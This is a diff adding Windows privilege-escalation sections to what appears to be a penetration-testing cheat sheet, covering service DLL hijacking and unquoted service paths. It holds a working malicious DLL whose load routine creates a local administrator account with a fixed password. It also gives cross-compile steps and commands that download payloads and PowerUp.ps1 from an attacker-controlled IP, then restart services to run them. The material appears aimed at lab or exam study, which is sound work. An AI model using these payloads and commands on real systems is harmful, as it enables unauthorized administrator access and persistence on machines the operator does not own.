@@ -369,3 +369,136 @@ powershell -ep bypass
 
 # This function displays services the current user can modify, such as the service binary or configuration files.
 Get-ModifiableServiceFile
+```
+
+### Service DLL Hijacking
+
+```bash
+# Check what binaries are running, as before
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+# Check for permissions on the binary if you find an interesting one
+icacls .\Documents\BetaServ.exe
+```
+If you have read and execute permissions (RX), then see if there is a missing DLL for the binary.
+
+You can use Process Monitor to display real-time information about any process, thread, file system, or registry related activities. Our goal is to identify all DLLs loaded by BetaService as well as detect missing ones. Once we have a list of DLLs used by the service binary, we can check their permissions and if they can be replaced with a malicious DLL. Alternatively, if find that a DLL is missing, we could try to provide our own DLL by adhering to the DLL search order.
+
+Since you need administritave privileges to run Process Monitor, it's standard practice to copy the service binary to a local machine. On this system, we can install the service locally and use Process Monitor with administrative privileges to list all DLL activity.
+Browse in the Windows Explorer to C:\tools\Procmon\ and double-click on Procmon64.exe.
+
+We enter the following arguments: Process Name as Column, is as Relation, BetaServ.exe as Value, and Include as Action. Once entered, we'll click on Add.
+
+After applying the filter, the list is empty. In order to analyze the service binary, we should try restarting the service as the binary will then attempt to load the DLLs.
+
+```ps
+> Restart-Service BetaService
+```
+
+Look for the Detail column to state NAME NOT FOUND for these calls, which means that a DLL with this name couldn't be found in any of these paths. You can see that the order in which the DLL is being called is 
+
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+
+You can verify with typing the command *$env:path* in Powershell.
+
+See if you have the ability to write to any of the directories that the DLL is being called from.
+
+If you do, this code can be used as a template for a DLL; note that in the case below we know that the DLL is trying to be loaded.. it's safer to spam all of the cases if you don't know what is going on.
+
+```cpp
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user overlord Password123! /add");
+  	    i = system ("net localgroup administrators overlord /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+Now, cross-compile the code with mingw, adding the *--shared* argument to specify that we want to build a DLL.
+
+```bash
+x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+```
+
+Then on the Windows machine..
+
+```bash
+cd Documents
+iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
+net user
+Restart-Service BetaService
+net user
+net localgroup administrators  # Confirm that the new user is created (with administrators privileges)
+```
+
+### Unquoted Service Paths
+
+We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them.
+
+You can use this script in cmd to search for these files:
+
+```bash
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+Now, you need to check if you have the permissions to start and stop the services that you (assumably) have found:
+
+```bash
+Start-Service GammaService
+Stop-Service GammaService
+```
+
+Now, you need to see if you have the permissions to write in any of the vulnerable directories:
+
+```bash
+icacls "C:\"
+icacls "C:\Program Files"
+icacls "C:\Program Files\Enterprise Apps"
+```
+
+You can use the same executable that we made above to replace the binary file.
+
+```bash
+iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
+copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+Start-Service GammaService
+net user 
+net localgroup administrators # Verify the executable worked
+```
+
+Don't forget to put everything back where it was. :)
+
+*Automated Unquoted Service Paths Exploitation*
+
+```bash
+iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-UnquotedService
+Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+Restart-Service GammaService
+net user
+net localgroup administrators # Verify
+```
